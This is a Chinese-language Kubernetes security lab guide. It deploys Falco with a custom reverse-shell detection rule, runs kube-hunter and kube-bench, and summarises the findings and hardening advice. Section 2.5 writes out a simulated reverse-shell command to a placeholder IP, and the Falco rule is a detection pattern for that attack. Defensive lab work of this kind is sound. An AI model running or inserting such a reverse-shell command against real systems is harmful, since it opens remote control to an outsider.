# K8s Security Practice（Killercoda Kubernetes Playground 版）
> 云原生安全工具实战：Falco + kube-hunter + kube-bench

## 实验基础信息
- 实验平台：Killercoda Kubernetes Playground（K8s v1.35）
- 集群节点：controlplane（主节点）、node01（工作节点）
- 工具版本：Falco 0.43.1、kube-hunter 0.6.8、kube-bench 0.6.12
- 部署方式：Helm（Falco）、Docker 容器（kube-hunter/kube-bench）

---

## 一、环境部署与集群验证（新增完整流程）
### 1.1 Killercoda 在线环境启动
1. 访问官网：https://killercoda.com/kubernetes/playground
2. 点击 **Start** 启动在线 K8s 实验环境，等待 1-2 分钟初始化完成
3. 初始化成功后，自动进入命令行操作界面

### 1.2 集群基础环境检查
```bash
# 验证 K8s 集群节点状态
kubectl get nodes

# 验证集群核心信息
kubectl cluster-info

# 检查 Helm 环境（Killercoda 已预置）
helm version

# 检查 Docker 环境（工具运行依赖）
docker --version
```
✅ 环境达标标准：
- 2 个节点状态均为 **Ready**
- Helm、Docker 命令可正常执行

### 1.3 基础环境配置
```bash
# 更新 Helm 仓库索引（确保拉取最新 Chart）
helm repo update
```

---

## 二、Falco 运行时安全监控
### 2.1 Helm 部署 Falco
```bash
# 添加 Falco 官方 Helm 仓库
helm repo add falcosecurity https://falcosecurity.github.io/charts

# 创建命名空间并部署 Falco
helm install falco falcosecurity/falco --namespace falco --create-namespace
```

### 2.2 验证 Falco 部署状态
```bash
kubectl get pods -n falco -o wide
```
✅ 预期结果：每个节点运行 1 个 Falco Pod，状态为 **Running**

### 2.3 自定义反弹 Shell 检测规则
```bash
# 自动获取 Falco Pod 名称
FALCO_POD=$(kubectl get pods -n falco -o name | head -1 | cut -d/ -f2)

# 创建自定义规则目录
kubectl exec -n falco $FALCO_POD -- mkdir -p /etc/falco/rules.d

# 写入反弹 Shell 检测规则
kubectl exec -n falco $FALCO_POD -- sh -c "cat > /etc/falco/rules.d/custom_rules.yaml << 'EOF'
- rule: Reverse Shell Detect
  desc: Detect reverse shell behavior in container
  condition: spawned_process and proc.cmdline contains \" -i >& /dev/tcp/\"
  output: \"Critical: Reverse shell detected (command=%proc.cmdline)\"
  priority: CRITICAL
EOF"

# 热加载规则（无需重启 Pod）
kubectl exec -n falco $FALCO_POD -- pkill -HUP falco
```

### 2.4 验证规则加载
```bash
kubectl logs -n falco $FALCO_POD | grep custom_rules.yaml
```
✅ 预期结果：`schema validation: ok`

### 2.5 模拟攻击与告警验证
```bash
# 新建终端，启动临时测试容器
kubectl run -it --rm test-shell --image=busybox -- sh

# 容器内执行反弹 Shell 模拟攻击
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

```bash
# 原终端查看 Falco 实时告警
kubectl logs -n falco $FALCO_POD | grep "Reverse shell detected"
```

---

## 三、kube-hunter 主动安全扫描
### 3.1 执行集群漏洞扫描
```bash
docker run --rm -it aquasec/kube-hunter --pod
```

### 3.2 核心风险解读
1. **CAP_NET_RAW Enabled**：Pod 默认开启原生网络权限，可发起 ARP/IP 欺骗攻击
2. **K8s Version Disclosure**：集群版本暴露，易被针对性利用漏洞

### 3.3 加固建议
- 在 Pod `SecurityContext` 中禁用 `CAP_NET_RAW` 内核能力
- 限制未授权访问 K8s `/version` 接口

---

## 四、kube-bench CIS 基线合规检查
### 4.1 执行 Master 节点合规检查
```bash
docker run --rm -v /etc/kubernetes:/etc/kubernetes aquasec/kube-bench:latest run --targets master
```

### 4.2 核心不合规项
1. etcd 数据目录权限/属主配置不达标
2. API Server 授权模式为 `AlwaysAllow`，未启用 RBAC
3. 未关闭不安全端口 `--insecure-port=0`

### 4.3 一键修复示例
```bash
# 编辑 API Server 配置文件关闭不安全端口
vi /etc/kubernetes/manifests/kube-apiserver.yaml

# 添加参数：--insecure-port=0，保存后自动重启生效
```

---

## 五、实验总结
| 工具 | 核心能力 | 主要发现 | 加固建议 |
| ---- | -------- | -------- | -------- |
| Falco | 容器运行时实时监控 | 可精准检测反弹 Shell 恶意行为 | 自定义规则+集成告警通道 |
| kube-hunter | 集群主动漏洞扫描 | CAP_NET_RAW 权限滥用、版本泄露 | 禁用非必要内核能力、限制接口访问 |
| kube-bench | CIS 基线合规检查 | 37 项配置不合规，权限/端口/存储存在风险 | 按官方修复指南逐一加固 |

---

## 六、常见问题排查
1. **Falco Pod 启动失败**
   ```bash
   kubectl describe pod <pod-name> -n falco
   ```
2. **自定义规则未生效**
   重新执行热加载命令：`kubectl exec -n falco $FALCO_POD -- pkill -HUP falco`
3. **kube-bench 无输出**
   检查 `/etc/kubernetes` 目录挂载路径是否正确
4. **Helm 拉取 Chart 失败**
   执行 `helm repo update` 刷新仓库

---

## 七、后续学习方向
1. 基于 kube-bench 结果完成 K8s 集群全量安全加固
2. 学习 OPA Gatekeeper 实现策略即代码（PaC）
3. 使用 Trivy 扫描容器镜像漏洞
4. 搭建 Falco 企业级告警平台（Slack/钉钉集成）
